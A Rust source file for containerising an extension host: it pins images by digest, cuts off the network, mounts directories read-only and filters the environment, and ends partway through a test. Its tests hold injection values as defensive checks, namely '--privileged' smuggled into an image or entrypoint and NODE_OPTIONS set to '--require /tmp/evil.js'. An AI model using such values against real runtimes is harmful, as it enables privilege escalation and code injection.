//! Where the extension host runs: inside a container, or as a bare process.
//!
//! The three layers in [`crate::host`] all run *inside* the Node process. They
//! depend on the runtime itself, which is not pinned. deco uses the `node`
//! installed on the machine, so its version, build and linked libraries are
//! outside deco's control. The flag that implements layer 1 is also a property
//! of that runtime.
//!
//! A container addresses this. The image is named by digest, so the runtime is
//! pinned the same way this project pins its CI actions. The kernel blocks the
//! network, instead of the bootstrap deleting JavaScript globals. The mounts
//! define which files an extension can see, instead of a runtime flag.
//!
//! # What a container does not do
//!
//! "Containerised" does not automatically mean "safe", so the limits are listed
//! here.
//!
//! The workspace is **not mounted**. Extensions read and write files through
//! brokered requests that deco performs for them, so the container needs no
//! access to the project. This is what gives the container its value. If the
//! workspace were mounted, the container would add little, because a bind mount
//! would expose all the files an extension is likely to target.
//!
//! Two directories are mounted read-only: deco's own host code, and the
//! extension being run. Nothing else is mounted, and nothing is writable except
//! a small `tmpfs`.
//!
//! # Turning it off
//!
//! [`Sandbox::Process`] runs the host directly as a child process. It exists to
//! distinguish a container problem from an extension problem, and it must be
//! selected explicitly. If no container runtime is found, deco does not start
//! the host, instead of running it with one layer fewer. A sandbox that degrades
//! without notice is worse than no sandbox, because the user cannot tell which
//! one is in effect.
//!
//! For the same reason the policy is read from **deco's defaults and the user's
//! own settings only**. Workspace configuration must not be able to disable
//! isolation for its extensions. [`overridden_by`] identifies configuration
//! layers that attempted an override so the frontend can report them.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use deco_config::{Scope, Settings};

use crate::host::{build_spec, HostConfig, HostSpec};

/// The setting choosing how the host is isolated.
pub const SANDBOX_KEY: &str = "deco.extensions.sandbox";

/// The setting naming the container runtime.
pub const RUNTIME_KEY: &str = "deco.extensions.containerRuntime";

/// The setting naming the image the host runs in.
pub const IMAGE_KEY: &str = "deco.extensions.containerImage";

/// The image the host runs in unless the user names another.
///
/// Pinned by digest, not by tag, because a tag can be moved and this project
/// pins the runtime that extensions execute on. This digest is the
/// multi-architecture index for `node:22-bookworm-slim` (amd64, arm64, armv7,
/// ppc64le) and contains Node 22.23.2, newer than the 22.13 that `--permission`
/// needs. `bookworm-slim` is used instead of `alpine` because extensions ship
/// prebuilt native modules linked against glibc.
pub const DEFAULT_IMAGE: &str = "docker.io/library/node:22-bookworm-slim@sha256:d649c27dae7ba0137b3cef5dd75baa422c08dc3d9e3fc0c23dfb172dc3cc6436";

/// Runtimes tried, in order, when the user has not named one.
///
/// Podman first, because it is rootless by default: the process that starts the
/// container does not run as root.
pub const RUNTIMES: [&str; 2] = ["podman", "docker"];

/// Where mounts are placed inside the container.
const MOUNT_ROOT: &str = "/deco/mnt";

/// The size of the writable `tmpfs`, in megabytes. Node needs a location for
/// temporary files; the rest of the filesystem is read-only.
const TMPFS_MB: u64 = 16;

/// Added to the V8 heap cap to get the container's memory limit. A Node process
/// uses its heap plus its own code, stacks and buffers. Without the margin, a
/// container killed for exceeding its heap by a small amount would look like an
/// unexplained crash.
const MEMORY_MARGIN_MB: u64 = 256;

/// How many processes the container may hold.
const PIDS_LIMIT: u64 = 256;

/// The container's hostname.
///
/// Fixed instead of left to the runtime, which uses the container id. deco builds
/// the environment explicitly so that what an extension can read is known in
/// advance. An id that changes on every run is neither predictable nor useful.
const HOSTNAME: &str = "deco-host";

/// The variables an extension sees inside the container that deco did not set:
/// the image's own.
///
/// These are documented, not removed. The runtime needs `PATH` to find `node`,
/// and the rest is metadata the Node image sets in its own layers. None of them
/// come from deco's environment. The list is short enough to state in full; an
/// unlisted name in the container means the image has changed.
pub const IMAGE_ENVIRONMENT: [&str; 5] =
    ["HOME", "HOSTNAME", "NODE_VERSION", "PATH", "YARN_VERSION"];

/// Variables a container runtime adds itself.
///
/// Podman sets `container=podman`, an OCI convention that lets software detect a
/// container; Docker sets nothing. Neither comes from deco or carries information
/// about the machine. They are listed so the test of what an extension can see
/// accepts exactly these names and nothing else.
pub const RUNTIME_INJECTED: [&str; 1] = ["container"];

/// The variables the **container runtime** keeps from deco's environment.
///
/// This differs from the rest of the crate. Elsewhere the environment is built
/// from scratch, because the process being started is untrusted. Here the
/// process is `docker` or `podman`, which must find its daemon. The untrusted
/// code runs inside the container and sees only what `--env` passes to it. The
/// CLI therefore keeps the few variables that tell it where to connect, and
/// nothing that looks like a credential.
pub const RUNTIME_ENVIRONMENT: [&str; 7] = [
    // Finding the daemon. Podman rootless keeps its socket under the runtime
    // directory; Docker takes an explicit host or a named context.
    "CONTAINER_HOST",
    "DOCKER_CONTEXT",
    "DOCKER_HOST",
    "XDG_RUNTIME_DIR",
    // Finding its own configuration.
    "HOME",
    "PATH",
    // Windows needs this to start any process.
    "SystemRoot",
];

/// How the extension host is isolated.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum Sandbox {
    /// In a container, with the runtime pinned by digest. The default.
    #[default]
    Container,
    /// Directly, as a child process of deco. Must be asked for explicitly.
    Process,
}

impl Sandbox {
    /// Parses the setting value.
    pub fn parse(value: &str) -> Option<Self> {
        match value {
            "container" => Some(Self::Container),
            "process" => Some(Self::Process),
            _ => None,
        }
    }

    /// The value used in settings.
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Container => "container",
            Self::Process => "process",
        }
    }
}

/// Failure to prepare a sandbox.
#[derive(Debug, thiserror::Error, PartialEq, Eq)]
pub enum SandboxError {
    /// No container runtime was found, and the policy asks for one.
    #[error(
        "no container runtime found (tried {tried}); install Podman or Docker, \
         or set `{SANDBOX_KEY}` to \"process\" to run the extension host \
         without a container"
    )]
    NoRuntime {
        /// The names that were looked for, for the message.
        tried: String,
    },
    /// The named runtime is not one deco will run.
    #[error(
        "`{name}` is not a container runtime deco will start; name `podman`, \
         `docker`, or an absolute path to one"
    )]
    UnknownRuntime {
        /// What was named.
        name: String,
    },
    /// The image is not pinned to a digest.
    #[error(
        "the extension host image must be pinned by digest, as \
         `name@sha256:<64 hex>`, but `{image}` is not: a tag can be moved, and \
         the runtime extensions execute on is not a moving target"
    )]
    UnpinnedImage {
        /// What was named.
        image: String,
    },
    /// A value would be parsed as a command-line option.
    #[error("`{value}` starts with `-`, which the container runtime would read as an option")]
    LooksLikeAnOption {
        /// What was named.
        value: String,
    },
    /// A path cannot be expressed as a mount.
    #[error("{path} cannot be mounted: {why}")]
    Unmountable {
        /// The offending path.
        path: String,
        /// Why it cannot be used.
        why: &'static str,
    },
    /// The bootstrap is not inside anything that gets mounted.
    #[error(
        "the host bootstrap at {bootstrap} is not inside any mounted directory, \
         so the container could not read it"
    )]
    BootstrapNotMounted {
        /// The bootstrap path.
        bootstrap: String,
    },
}

/// The isolation policy, read from the layers that are allowed to set it.
///
/// Unreadable or unknown values fall back to the default, not to
/// [`Sandbox::Process`], so a typo cannot remove a layer.
pub fn policy(settings: &Settings) -> Sandbox {
    trusted(settings, SANDBOX_KEY)
        .and_then(|value| value.as_str())
        .and_then(Sandbox::parse)
        .unwrap_or_default()
}

/// The scopes that set `key` but are not allowed to.
///
/// Returned so a caller can *report* that a workspace tried to change the
/// sandbox. Otherwise the user could believe the workspace setting is in effect.
pub fn overridden_by(settings: &Settings, key: &str) -> Vec<Scope> {
    [Scope::Workspace, Scope::Folder, Scope::Remote]
        .into_iter()
        .filter(|scope| {
            settings
                .layer(*scope)
                .is_some_and(|layer| layer.contains_key(key))
        })
        .collect()
}

/// A setting's value, from deco's defaults or the user's own file only.
fn trusted<'a>(settings: &'a Settings, key: &str) -> Option<&'a serde_json::Value> {
    [Scope::User, Scope::Default]
        .into_iter()
        .find_map(|scope| settings.layer(scope).and_then(|layer| layer.get(key)))
}

/// Everything about the container the host runs in.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ContainerConfig {
    /// Absolute path to `podman` or `docker`.
    pub runtime: PathBuf,
    /// The image, pinned by digest.
    pub image: String,
    /// The Node program **inside the image**. Passed as `--entrypoint`, so the
    /// image's own entrypoint script never runs. The container starts with the
    /// argv that deco built, not one defined by an image layer.
    pub node: String,
}

impl ContainerConfig {
    /// Reads the container configuration out of settings and the environment.
    ///
    /// `path` is the `PATH` to search for a runtime. It is a parameter instead of
    /// being read from the process environment, so the search is testable.
    pub fn resolve(
        settings: &Settings,
        path: Option<&std::ffi::OsStr>,
    ) -> Result<Self, SandboxError> {
        let runtime = match trusted(settings, RUNTIME_KEY).and_then(|value| value.as_str()) {
            Some(named) => {
                let named = named.trim();
                let path_of = Path::new(named);
                if path_of.is_absolute() {
                    path_of.to_path_buf()
                } else if RUNTIMES.contains(&named) {
                    find_runtime(&[named], path).ok_or_else(|| SandboxError::NoRuntime {
                        tried: named.to_owned(),
                    })?
                } else {
                    return Err(SandboxError::UnknownRuntime {
                        name: named.to_owned(),
                    });
                }
            }
            None => find_runtime(&RUNTIMES, path).ok_or_else(|| SandboxError::NoRuntime {
                tried: RUNTIMES.join(", "),
            })?,
        };

        let image = trusted(settings, IMAGE_KEY)
            .and_then(|value| value.as_str())
            .map(|named| named.trim().to_owned())
            .unwrap_or_else(|| DEFAULT_IMAGE.to_owned());
        check_pinned(&image)?;
        not_an_option(&image)?;

        Ok(Self {
            runtime,
            image,
            node: "node".to_owned(),
        })
    }

    /// The memory ceiling for a host with these limits, in megabytes.
    fn memory_mb(limits: &crate::host::HostLimits) -> u64 {
        limits.max_old_space_mb + MEMORY_MARGIN_MB
    }
}

/// Finds the first of `names` on `path`, as an absolute path.
///
/// Absolute because [`crate::connection::Host::spawn`] rejects a bare name. The
/// environment it starts a process with has no `PATH` for the operating system
/// to search.
pub fn find_runtime(names: &[&str], path: Option<&std::ffi::OsStr>) -> Option<PathBuf> {
    let path = path?;
    for name in names {
        let file = if cfg!(windows) {
            format!("{name}.exe")
        } else {
            (*name).to_owned()
        };
        if let Some(found) = std::env::split_paths(&path)
            .map(|dir| dir.join(&file))
            .find(|candidate| candidate.is_file())
        {
            return Some(found);
        }
    }
    None
}

/// Rejects an image that is not pinned to a digest.
fn check_pinned(image: &str) -> Result<(), SandboxError> {
    let unpinned = || SandboxError::UnpinnedImage {
        image: image.to_owned(),
    };
    let (_, digest) = image.rsplit_once("@sha256:").ok_or_else(unpinned)?;
    if digest.len() != 64 || !digest.bytes().all(|b| b.is_ascii_hexdigit()) {
        return Err(unpinned());
    }
    Ok(())
}

/// Rejects a value the runtime would parse as an option.
fn not_an_option(value: &str) -> Result<(), SandboxError> {
    if value.starts_with('-') {
        return Err(SandboxError::LooksLikeAnOption {
            value: value.to_owned(),
        });
    }
    Ok(())
}

/// Which host directory is mounted where inside the container.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct Mounts {
    entries: Vec<(PathBuf, String)>,
}

impl Mounts {
    /// Places each root at `/deco/mnt/<n>`, in the order given.
    ///
    /// Numbered instead of named after the directory. A directory name would
    /// become part of the container's filesystem layout, and the extension must
    /// not learn where deco stores files on this machine.
    pub fn new(roots: &[PathBuf]) -> Result<Self, SandboxError> {
        let mut entries = Vec::with_capacity(roots.len());
        for (index, root) in roots.iter().enumerate() {
            let shown = root.display().to_string();
            if !root.is_absolute() {
                return Err(SandboxError::Unmountable {
                    path: shown,
                    why: "a mount source has to be an absolute path",
                });
            }
            // `--mount` takes comma-separated options, so a comma in the source
            // would end the source and start another option. Rejected instead of
            // escaped, because the option parser supports no escape.
            if shown.contains(',') {
                return Err(SandboxError::Unmountable {
                    path: shown,
                    why: "a comma would be read as the end of the mount source",
                });
            }
            entries.push((root.clone(), format!("{MOUNT_ROOT}/{index}")));
        }
        Ok(Self { entries })
    }

    /// The container path for a host path inside one of the mounted roots.
    ///
    /// Returns `None` for paths outside the mounted roots because those paths
    /// are not accessible inside the container.
    pub fn inside(&self, path: &Path) -> Option<String> {
        for (root, target) in &self.entries {
            if !crate::capability::is_within(path, root) {
                continue;
            }
            // `is_within` compares normalised paths and `strip_prefix` does not,
            // so the two can disagree, for example for a root containing `.`.
            // In that case, continue with the next root instead of returning.
            let Ok(suffix) = path.strip_prefix(root) else {
                continue;
            };
            let mut translated = target.clone();
            for part in suffix.components() {
                translated.push('/');
                translated.push_str(&part.as_os_str().to_string_lossy());
            }
            return Some(translated);
        }
        None
    }

    /// The container paths, in mount order.
    pub fn targets(&self) -> Vec<&str> {
        self.entries
            .iter()
            .map(|(_, target)| target.as_str())
            .collect()
    }

    /// The `--mount` arguments, in mount order.
    fn arguments(&self) -> Vec<String> {
        self.entries
            .iter()
            .flat_map(|(source, target)| {
                [
                    "--mount".to_owned(),
                    format!(
                        "type=bind,source={},target={target},readonly",
                        source.display()
                    ),
                ]
            })
            .collect()
    }
}

/// A host command line that runs inside a container, and its mount layout.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Containerised {
    /// The command to run: the container runtime, with the host's own command
    /// line after the image.
    pub spec: HostSpec,
    /// Where each readable root was mounted, for translating the paths that go
    /// over the wire afterwards.
    pub mounts: Mounts,
}

/// Builds the command line that starts the host inside a container.
///
/// The Node flags are not repeated here. The translated configuration goes
/// through [`build_spec`], which remains the only place that defines the host's
/// command line. This function adds only the container's own options:
///
/// - `--network=none` blocks the network in the kernel. Layer 2 deletes
///   `fetch` and rejects `net`, which gives a clear error but is not a barrier;
///   a native module can bypass it.
/// - `--read-only`, plus a small `tmpfs` and two read-only mounts, leaves no
///   writable location and nothing readable that deco did not provide.
/// - `--cap-drop=ALL` and `--security-opt=no-new-privileges` remove the means
///   of privilege escalation.
/// - `--memory` and `--pids-limit` confine a runaway extension to the
///   container instead of affecting the machine.
///
/// deco does not pass `--user`. Under rootless Podman the container's root is
/// already the user's own unprivileged uid. Specifying a uid maps it into a
/// subordinate range that cannot read the bind mounts, so the flag would break
/// the common case without improving it.
pub fn containerise(
    config: &HostConfig,
    container: &ContainerConfig,
    extension_id: &str,
) -> Result<Containerised, SandboxError> {
    check_pinned(&container.image)?;
    not_an_option(&container.image)?;
    not_an_option(&container.node)?;

    let mounts = Mounts::new(&config.readable_roots)?;
    let bootstrap =
        mounts
            .inside(&config.bootstrap)
            .ok_or_else(|| SandboxError::BootstrapNotMounted {
                bootstrap: config.bootstrap.display().to_string(),
            })?;

    // The same configuration as seen from inside the container: every path
    // exists in the container, and `node` is the image's program name.
    let inside = HostConfig {
        node: PathBuf::from(&container.node),
        bootstrap: PathBuf::from(&bootstrap),
        readable_roots: mounts.targets().into_iter().map(PathBuf::from).collect(),
        // Nothing is writable, so the working directory is the first mount,
        // which is deco's own host code.
        cwd: PathBuf::from(mounts.targets().first().copied().unwrap_or(MOUNT_ROOT)),
        limits: config.limits,
        node_permission_model: config.node_permission_model,
        allow_code_generation: config.allow_code_generation,
    };
    let host = build_spec(&inside, extension_id);

    let mut args = vec![
        "run".to_owned(),
        "--rm".to_owned(),
        "--interactive".to_owned(),
        "--network=none".to_owned(),
        "--read-only".to_owned(),
        "--cap-drop=ALL".to_owned(),
        "--security-opt=no-new-privileges".to_owned(),
        // Otherwise the runtime sets `HOSTNAME` to the container's id, which
        // changes on every run. A fixed value keeps the extension's environment
        // identical across runs, so tests can assert it exactly.
        format!("--hostname={HOSTNAME}"),
        format!("--pids-limit={PIDS_LIMIT}"),
        format!("--memory={}m", ContainerConfig::memory_mb(&config.limits)),
        format!("--tmpfs=/tmp:rw,noexec,nosuid,size={TMPFS_MB}m"),
    ];
    args.extend(mounts.arguments());
    args.push("--workdir".to_owned());
    args.push(inside.cwd.display().to_string());
    // The two variables the host receives. `--env NAME=value` is used instead
    // of `--env NAME`, which would copy deco's own value.
    for (key, value) in &host.env {
        // A Windows-only variable has no meaning in a Linux container.
        // `build_spec` adds `SystemRoot` only to start Node directly on Windows.
        if !key.starts_with("DECO_") {
            continue;
        }
        args.push("--env".to_owned());
        args.push(format!("{key}={value}"));
    }
    args.push("--entrypoint".to_owned());
    args.push(container.node.clone());
    args.push(container.image.clone());
    // Everything after the image is Node's own command line, unchanged.
    args.extend(host.args);

    Ok(Containerised {
        spec: HostSpec {
            program: container.runtime.clone(),
            args,
            env: runtime_environment(std::env::vars_os()),
            // The working directory of the runtime CLI. It does not apply inside
            // the container, which uses `--workdir` above; it only needs to exist.
            cwd: config.cwd.clone(),
        },
        mounts,
    })
}

/// A host that is ready to start, with the decisions made while preparing it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Prepared {
    /// The command line to run.
    pub spec: HostSpec,
    /// Which policy this spec implements.
    pub sandbox: Sandbox,
    /// Where each readable root was mounted, or `None` outside a container,
    /// where host paths are already the paths the host sees.
    pub mounts: Option<Mounts>,
    /// Settings layers that tried to choose the sandbox and were not allowed to.
    ///
    /// Returned instead of logged here. The frontend decides whether to show a
    /// status bar warning or a log line, but it must report it somehow.
    pub ignored: Vec<Scope>,
}

impl Prepared {
    /// The path the host uses for a given host path.
    ///
    /// With this function, callers do not need to know whether a container is
    /// used. An `extensionPath` on the wire must be a path the *host* can open,
    /// and that path depends on the policy.
    pub fn seen_by_host(&self, path: &Path) -> Option<String> {
        match &self.mounts {
            Some(mounts) => mounts.inside(path),
            None => Some(path.display().to_string()),
        }
    }
}

/// Decides how to start the host, and builds the command line for it.
///
/// The whole decision is made here: read the policy from the layers allowed to
/// set it, then either containerise or not. There is intentionally no fallback
/// from one to the other. A caller that cannot get a container receives an error
/// naming the setting, and a user who wants a bare process must set it.
pub fn prepare(
    settings: &Settings,
    config: &HostConfig,
    extension_id: &str,
    path: Option<&std::ffi::OsStr>,
) -> Result<Prepared, SandboxError> {
    let sandbox = policy(settings);
    let ignored = [SANDBOX_KEY, RUNTIME_KEY, IMAGE_KEY]
        .into_iter()
        .flat_map(|key| overridden_by(settings, key))
        .collect::<std::collections::BTreeSet<_>>()
        .into_iter()
        .collect();

    match sandbox {
        Sandbox::Container => {
            let container = ContainerConfig::resolve(settings, path)?;
            let made = containerise(config, &container, extension_id)?;
            Ok(Prepared {
                spec: made.spec,
                sandbox,
                mounts: Some(made.mounts),
                ignored,
            })
        }
        Sandbox::Process => Ok(Prepared {
            spec: build_spec(config, extension_id),
            sandbox,
            mounts: None,
            ignored,
        }),
    }
}

/// The environment the container runtime is started with: the allowlist above,
/// and only where the parent actually has the variable.
pub fn runtime_environment(
    parent: impl IntoIterator<Item = (std::ffi::OsString, std::ffi::OsString)>,
) -> BTreeMap<String, String> {
    let mut env = BTreeMap::new();
    for (key, value) in parent {
        let key = key.to_string_lossy().into_owned();
        if RUNTIME_ENVIRONMENT.contains(&key.as_str()) {
            env.insert(key, value.to_string_lossy().into_owned());
        }
    }
    env
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::host::HostLimits;
    use serde_json::json;

    fn settings(scope: Scope, key: &str, value: serde_json::Value) -> Settings {
        let mut settings = Settings::empty();
        let mut layer = serde_json::Map::new();
        layer.insert(key.to_owned(), value);
        settings.set_layer(scope, layer);
        settings
    }

    /// An absolute path for this platform, built from Unix-style parts.
    ///
    /// Every path in these tests goes through this function because of an actual
    /// failure. With the literal `/opt/deco/host`, twelve tests below tested
    /// something different on Windows. `/opt/deco/host` has no drive letter, so
    /// `Mounts::new` rejected it as relative. Each test that expected a
    /// *successful* spec was actually testing the rejection path, while still
    /// passing on Linux.
    fn absolute(parts: &str) -> PathBuf {
        let parts = parts.trim_start_matches('/');
        if cfg!(windows) {
            PathBuf::from(format!("C:\\{}", parts.replace('/', "\\")))
        } else {
            PathBuf::from(format!("/{parts}"))
        }
    }

    /// The same, as the string a settings file would hold.
    fn absolute_str(parts: &str) -> String {
        absolute(parts).display().to_string()
    }

    fn config() -> HostConfig {
        HostConfig {
            node: absolute("usr/bin/node"),
            bootstrap: absolute("opt/deco/host/src/bootstrap.js"),
            readable_roots: vec![
                absolute("opt/deco/host"),
                absolute("home/u/.deco/extensions/acme.ext"),
            ],
            cwd: absolute("home/u/project"),
            limits: HostLimits::default(),
            node_permission_model: true,
            allow_code_generation: false,
        }
    }

    fn container() -> ContainerConfig {
        ContainerConfig {
            runtime: absolute("usr/bin/podman"),
            image: DEFAULT_IMAGE.to_owned(),
            node: "node".to_owned(),
        }
    }

    #[test]
    fn the_fixtures_use_paths_this_platform_calls_absolute() {
        // Guards against the failure described on `absolute`. Without it, the
        // suite is reliable only on the platform it was written on, and on other
        // platforms it fails by passing.
        let config = config();
        let mut paths = vec![config.bootstrap, config.cwd, container().runtime];
        paths.extend(config.readable_roots);
        for path in paths {
            assert!(
                path.is_absolute(),
                "{} is not absolute here, so the fixture is testing a refusal",
                path.display()
            );
        }
    }

    #[test]
    fn the_default_is_a_container() {
        assert_eq!(Sandbox::default(), Sandbox::Container);
        assert_eq!(policy(&Settings::empty()), Sandbox::Container);
        assert_eq!(policy(&Settings::with_defaults()), Sandbox::Container);
    }

    #[test]
    fn the_user_may_turn_the_container_off_and_a_workspace_may_not() {
        let user = settings(Scope::User, SANDBOX_KEY, json!("process"));
        assert_eq!(policy(&user), Sandbox::Process);

        // The case this rule exists for: a cloned repository whose
        // `.vscode/settings.json` turns off the sandbox for its own extensions.
        for scope in [Scope::Workspace, Scope::Folder, Scope::Remote] {
            let sneaky = settings(scope, SANDBOX_KEY, json!("process"));
            assert_eq!(
                policy(&sneaky),
                Sandbox::Container,
                "{scope:?} should not be able to turn the sandbox off"
            );
            assert_eq!(overridden_by(&sneaky, SANDBOX_KEY), vec![scope]);
        }
    }

    #[test]
    fn an_attempt_to_override_is_reported_rather_than_swallowed() {
        let mut settings = settings(Scope::Workspace, SANDBOX_KEY, json!("process"));
        let mut folder = serde_json::Map::new();
        folder.insert(IMAGE_KEY.to_owned(), json!("evil@sha256:00"));
        settings.set_layer(Scope::Folder, folder);
        assert_eq!(
            overridden_by(&settings, SANDBOX_KEY),
            vec![Scope::Workspace]
        );
        assert_eq!(overridden_by(&settings, IMAGE_KEY), vec![Scope::Folder]);
        assert!(overridden_by(&settings, RUNTIME_KEY).is_empty());
    }

    #[test]
    fn a_misspelled_policy_keeps_the_container_rather_than_losing_it() {
        for value in [json!("Process"), json!("none"), json!(false), json!(0)] {
            let settings = settings(Scope::User, SANDBOX_KEY, value.clone());
            assert_eq!(
                policy(&settings),
                Sandbox::Container,
                "{value} should not have turned the sandbox off"
            );
        }
    }

    #[test]
    fn the_policy_round_trips_through_its_spelling() {
        for policy in [Sandbox::Container, Sandbox::Process] {
            assert_eq!(Sandbox::parse(policy.as_str()), Some(policy));
        }
        assert_eq!(Sandbox::parse("container"), Some(Sandbox::Container));
        assert_eq!(Sandbox::parse(""), None);
    }

    #[test]
    fn the_shipped_image_is_pinned_to_a_digest() {
        // If the default became a tag, the runtime would be whatever image was
        // pushed last, and no guarantee about it would hold.
        assert!(check_pinned(DEFAULT_IMAGE).is_ok(), "{DEFAULT_IMAGE}");
        assert!(DEFAULT_IMAGE.contains("@sha256:"));
    }

    #[test]
    fn an_image_that_is_not_pinned_is_refused() {
        for image in [
            "node:22",
            "node:22-bookworm-slim",
            "node@sha256:abc",
            "node@sha512:0000000000000000000000000000000000000000000000000000000000000000",
            "node@sha256:zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz",
        ] {
            assert_eq!(
                check_pinned(image),
                Err(SandboxError::UnpinnedImage {
                    image: image.to_owned()
                }),
                "{image} should have been refused"
            );
        }
    }

    #[test]
    fn a_value_the_runtime_would_read_as_an_option_is_refused() {
        // `docker run … --privileged` is parsed as an option wherever it appears,
        // so an image or entrypoint starting with a dash is an argument injection,
        // not just an unusual name.
        let mut config = container();
        config.image = format!("--privileged {DEFAULT_IMAGE}");
        assert!(matches!(
            containerise(&self::config(), &config, "acme.ext"),
            Err(SandboxError::UnpinnedImage { .. } | SandboxError::LooksLikeAnOption { .. })
        ));

        let mut config = container();
        config.node = "--privileged".to_owned();
        assert_eq!(
            containerise(&self::config(), &config, "acme.ext"),
            Err(SandboxError::LooksLikeAnOption {
                value: "--privileged".to_owned()
            })
        );
    }

    #[test]
    fn the_container_severs_the_network_and_writes_nothing() {
        let made = containerise(&config(), &container(), "acme.ext").expect("a spec");
        let args = made.spec.args.join(" ");
        for expected in [
            "--network=none",
            "--read-only",
            "--cap-drop=ALL",
            "--security-opt=no-new-privileges",
            "--rm",
            "--interactive",
        ] {
            assert!(args.contains(expected), "{expected} missing from {args}");
        }
        assert!(!args.contains("--privileged"));
        assert!(!args.contains("--network=host"));
        // The only writable location, and programs in it cannot be executed.
        assert!(args.contains("--tmpfs=/tmp:rw,noexec,nosuid,size=16m"));
    }

    #[test]
    fn the_workspace_is_not_mounted() {
        // This is what makes the container worth its cost. `cwd` is the project
        // and must not appear as a mount. Nothing outside the two readable roots
        // may appear either.
        let config = config();
        let made = containerise(&config, &container(), "acme.ext").expect("a spec");
        let mounts: Vec<&String> = made
            .spec
            .args
            .iter()
            .filter(|arg| arg.starts_with("type=bind"))
            .collect();
        assert_eq!(mounts.len(), 2, "{mounts:?}");
        assert!(!made
            .spec
            .args
            .iter()
            .any(|arg| arg.contains(&absolute_str("home/u/project"))));
        for mount in mounts {
            assert!(mount.ends_with("readonly"), "{mount} is writable");
        }
    }

    #[test]
    fn the_host_command_line_is_the_same_one_only_with_container_paths() {
        let made = containerise(&config(), &container(), "acme.ext").expect("a spec");
        let args = made.spec.args.join(" ");
        // Layer 1 is kept when layer 0 is added: they are independent.
        assert!(args.contains("--permission"));
        assert!(args.contains("--disallow-code-generation-from-strings"));
        assert!(args.contains("--max-old-space-size=512"));
        // Paths are the container's.
        assert!(args.ends_with("/deco/mnt/0/src/bootstrap.js"), "{args}");
        assert!(args.contains("--allow-fs-read=/deco/mnt/0"));
        assert!(args.contains("--allow-fs-read=/deco/mnt/1"));
        assert!(!args.contains(&format!(
            "--allow-fs-read={}",
            absolute_str("opt/deco/host")
        )));

        // A host path appears exactly once, as the source of its own mount. Only
        // the runtime needs to know where deco stores files. The argv after the
        // image is what Node, and therefore the extension, can read, and it must
        // not reveal this machine's directory layout.
        let image = made
            .spec
            .args
            .iter()
            .position(|arg| arg == DEFAULT_IMAGE)
            .expect("the image");
        let handed_to_node = made.spec.args[image + 1..].join(" ");
        for host_path in [
            absolute_str("opt/deco/host"),
            absolute_str("home/u/.deco/extensions"),
            absolute_str("home/u/project"),
        ] {
            assert!(
                !handed_to_node.contains(&host_path),
                "{host_path} reached the extension in {handed_to_node}"
            );
        }
    }

    #[test]
    fn the_image_is_the_last_thing_before_nodes_own_arguments() {
        let made = containerise(&config(), &container(), "acme.ext").expect("a spec");
        let image = made
            .spec
            .args
            .iter()
            .position(|arg| arg == DEFAULT_IMAGE)
            .expect("the image should be in the argv");
        // Everything after the image belongs to Node, so code that only appends
        // arguments cannot add a container option.
        assert_eq!(made.spec.args[image - 2], "--entrypoint");
        assert_eq!(made.spec.args[image - 1], "node");
        assert!(made.spec.args[image + 1..].iter().all(|arg| arg
            .starts_with("--max-old-space-size")
            || arg.starts_with("--disallow-code")
            || arg == "--permission"
            || arg.starts_with("--allow-fs-read=")
            || arg.ends_with("bootstrap.js")));
    }

    #[test]
    fn the_extension_sees_only_decos_own_two_variables() {
        let made = containerise(&config(), &container(), "acme.ext").expect("a spec");
        let passed: Vec<&String> = made
            .spec
            .args
            .iter()
            .zip(made.spec.args.iter().skip(1))
            .filter(|(flag, _)| *flag == "--env")
            .map(|(_, value)| value)
            .collect();
        assert_eq!(
            passed,
            vec![
                &"DECO_EXTENSION_ID=acme.ext".to_owned(),
                &format!("DECO_HOST_PROTOCOL={}", crate::host::PROTOCOL_VERSION),
            ]
        );
        // `--env NAME` without a value copies the parent's value. The environment
        // design exists to prevent that leak.
        assert!(!made.spec.args.iter().any(|arg| arg == "--env-file"));
    }

    #[test]
    fn the_runtime_keeps_what_it_needs_to_find_a_daemon_and_nothing_else() {
        let parent = [
            ("DOCKER_HOST", "unix:///run/user/1000/podman/podman.sock"),
            ("PATH", "/usr/bin"),
            ("HOME", "/home/u"),
            ("GITHUB_TOKEN", "ghp_should_not_appear"),
            ("AWS_SECRET_ACCESS_KEY", "also_not"),
            ("NODE_OPTIONS", "--require /tmp/evil.js"),
        ]
        .into_iter()
        .map(|(k, v)| (std::ffi::OsString::from(k), std::ffi::OsString::from(v)));
        let env = runtime_environment(parent);
        assert_eq!(
            env.keys().collect::<Vec<_>>(),
            vec!["DOCKER_HOST", "HOME", "PATH"]
        );
        // `NODE_OPTIONS` would inject a `--require` into the runtime CLI if it
        // were a Node program, and it is not needed to find a daemon.
        assert!(!env.contains_key("NODE_OPTIONS"));
    }

    #[test]
    fn memory_is_the_heap_plus_room_for_the_process_around_it() {
        let limits = HostLimits {
            max_old_space_mb: 512,
            ..HostLimits::default()
        };
        assert_eq!(ContainerConfig::memory_mb(&limits), 512 + MEMORY_MARGIN_MB);
        let made = containerise(&config(), &container(), "acme.ext").expect("a spec");
        assert!(made.spec.args.contains(&"--memory=768m".to_owned()));
        assert!(made.spec.args.contains(&"--pids-limit=256".to_owned()));
    }

    #[test]
    fn a_relative_root_cannot_be_mounted() {
        let mut config = config();
        config.readable_roots = vec![PathBuf::from("host")];
        assert!(matches!(
            containerise(&config, &container(), "acme.ext"),
            Err(SandboxError::Unmountable { .. })
        ));
    }

    #[test]
    fn a_comma_in_a_path_is_refused_rather_than_escaped() {
        // `--mount type=bind,source=/a,b,target=/x` parses as a source of `/a`
        // and an unknown option `b`. The option parser supports no quoting, so
        // rejecting the path is the only safe choice.
        let mut config = config();
        config.readable_roots = vec![absolute("opt/deco,host")];
        assert_eq!(
            containerise(&config, &container(), "acme.ext"),
            Err(SandboxError::Unmountable {
                path: absolute_str("opt/deco,host"),
                why: "a comma would be read as the end of the mount source",
            })
        );
    }

    #[test]
    fn a_bootstrap_outside_every_mount_is_refused_before_the_container_starts() {
        let mut config = config();
        config.bootstrap = absolute("somewhere/else/bootstrap.js");
        assert_eq!(
